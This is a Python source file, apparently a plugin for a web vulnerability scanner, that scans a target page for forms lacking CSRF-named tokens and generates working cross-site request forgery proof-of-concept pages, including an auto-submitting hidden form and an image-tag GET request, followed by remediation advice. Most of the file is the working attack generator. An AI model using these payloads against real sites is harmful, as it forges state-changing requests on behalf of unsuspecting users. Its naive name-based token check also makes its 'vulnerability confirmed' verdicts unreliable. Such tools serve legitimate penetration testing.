"""
CSRF (Cross-Site Request Forgery) Exploit Plugin

This plugin provides exploit capabilities for CSRF vulnerabilities including:
- CSRF PoC generation
- Token analysis
- Form submission testing
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

logger = logging.getLogger(__name__)


class CSRFPlugin(ExploitPlugin):
    """CSRF exploit plugin for generating proof-of-concept attacks."""
    
    @property
    def vulnerability_type(self) -> str:
        return 'csrf'
    
    @property
    def name(self) -> str:
        return 'CSRF Exploit'
    
    @property
    def description(self) -> str:
        return 'Cross-Site Request Forgery exploit plugin for generating PoC attacks.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate CSRF payloads and PoC HTML."""
        context = context or {}
        target_url = context.get('target_url', 'http://target.com/action')
        method = context.get('method', 'POST')
        parameters = context.get('parameters', {})
        
        # Generate HTML PoC
        if method.upper() == 'POST':
            form_fields = '\n'.join([f'  <input type="hidden" name="{k}" value="{v}" />' 
                                    for k, v in parameters.items()])
            poc = f'''<html>
<body>
<h1>CSRF PoC</h1>
<form action="{target_url}" method="POST">
{form_fields}
  <input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>'''
        else:
            params = '&'.join([f'{k}={v}' for k, v in parameters.items()])
            poc = f'''<html>
<body>
<h1>CSRF PoC</h1>
<img src="{target_url}?{params}" />
</body>
</html>'''
        
        return [poc]
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute CSRF attack by analyzing forms and generating PoC."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'csrf',
            }
        
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        logger.info(f"Analyzing CSRF protection on {target_url}")
        
        try:
            response = requests.get(target_url, timeout=timeout, verify=verify_ssl)
            
            if not HAS_BS4:
                return {
                    'success': False,
                    'error': 'BeautifulSoup not available for form analysis',
                    'vulnerability_type': 'csrf',
                }
            
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            vulnerable_forms = []
            
            for form in forms:
                # Check for CSRF tokens
                csrf_tokens = form.find_all('input', attrs={'name': lambda x: x and 'csrf' in x.lower()})
                
                if not csrf_tokens:
                    action = form.get('action', '')
                    method = form.get('method', 'GET').upper()
                    
                    # Extract form parameters
                    inputs = form.find_all('input')
                    params = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}
                    
                    # Generate PoC
                    poc = self.generate_payloads({
                        'target_url': target_url + action if action else target_url,
                        'method': method,
                        'parameters': params
                    })[0]
                    
                    vulnerable_forms.append({
                        'action': action,
                        'method': method,
                        'poc': poc
                    })
            
            if vulnerable_forms:
                return {
                    'success': True,
                    'vulnerable_forms': vulnerable_forms,
                    'evidence': f'Found {len(vulnerable_forms)} form(s) without CSRF protection',
                    'vulnerability_type': 'csrf',
                    'message': 'CSRF vulnerability confirmed',
                }
            else:
                return {
                    'success': False,
                    'error': 'All forms appear to have CSRF protection',
                    'vulnerability_type': 'csrf',
                }
        
        except Exception as e:
            logger.error(f"Error during CSRF exploitation: {e}")
            return {
                'success': False,
                'error': str(e),
                'vulnerability_type': 'csrf',
            }
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent CSRF attacks:\n'
            '1. Implement CSRF tokens in all state-changing requests\n'
            '2. Use SameSite cookie attribute\n'
            '3. Implement double-submit cookie pattern\n'
            '4. Validate Origin/Referer headers\n'
            '5. Use custom request headers\n'
            '6. Implement re-authentication for sensitive actions\n'
            '7. Use framework built-in CSRF protection\n'
            '8. Educate users about CSRF attacks'
        )
